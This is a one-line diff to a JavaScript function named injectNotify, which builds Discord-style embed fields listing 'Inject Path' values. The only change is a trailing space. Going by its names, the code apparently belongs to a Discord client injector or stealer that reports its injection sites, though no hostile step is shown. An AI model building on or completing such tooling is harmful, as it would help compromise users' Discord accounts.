@@ -159,7 +159,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: "<:bfdnonsfw:966774651449671761> Inject Path",
+            name: "<:bfdnonsfw:966774651449671761> Inject Path ",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
